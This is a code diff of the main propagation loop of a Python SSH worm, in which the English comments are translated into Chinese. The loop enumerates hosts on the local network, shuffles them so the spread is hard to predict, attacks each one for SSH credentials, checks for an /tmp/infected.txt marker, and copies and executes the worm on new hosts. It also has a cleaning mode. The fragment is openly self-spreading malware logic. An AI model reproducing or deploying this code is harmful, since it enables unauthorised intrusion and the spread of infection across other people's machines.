@@ -282,49 +282,43 @@ interface_list.remove( LOOPBACK_INTERFACE )
 
 for interface in interface_list:
     print("Interface: ", interface)
-    # Get the IP of the current system
+	# 取得當前系統之IP
     ip_addr = getMyIP( interface )
 
-    # Get the hosts on the same network
+	# 取得在相同網路上之host
     networkHosts = getHostsOnTheSameNetwork()
 
-    # Remove the IP of the current system
-    # from the list of discovered systems (we
-    # do not want to target ourselves!).
+	# 從已發現系統列表中刪除當前系統的IP(we do not want to target ourselves!)
     networkHosts.remove( ip_addr )
 
-    # Randomly shuffle hosts to make spread not predictable
+	# 對host隨機洗牌使散播難以被預測
     random.shuffle( networkHosts )
 
     print("Found hosts: ", networkHosts)
 
-    # Go through the network hosts
+    # 遍歷網絡主機
     for host in networkHosts:
-        # Try to attack this host
+		# 嘗試攻擊此host
         sshInfo =  attackSystem( host )
             
         print(sshInfo)
             
-        # Attack succeeded
+		# 攻擊成功
         if sshInfo:
             print("Credentials Found.\n[ CONNECTING . . . ]")
 
             sftp_client = sshInfo[0].open_sftp()
 
-            # Check if the system was	
-            # already infected. This can be
-            # done by checking whether the
-            # remote system contains /tmp/infected.txt
-            # file (which the worm will place there
-            # when it first infects the system)
+			# 檢查是否系統已被感染。
+			# 此可由檢查遠端系統是否存在/tmp/infected.txt檔案。
+			# (which the worm will place there when it first infects the system)
             if CLEANING_MODE:
                 print("[ REMOVING WORM . . . . ]")
                 clean_mess( sshInfo[0], sftp_client )
             else:
                 if not isInfectedSystem( sftp_client ):
-                    # If the system was already infected proceed.
-                    # Otherwise, infect the system and terminate.
-                    # Infect that system
+					# 如果系統已經被感染則繼續，否則感染系統並終止。
+					# 感染該系統
                     try:
                         print("[ INFECTING . . . . ]")
                         spreadAndExecute( sshInfo[0], sftp_client )
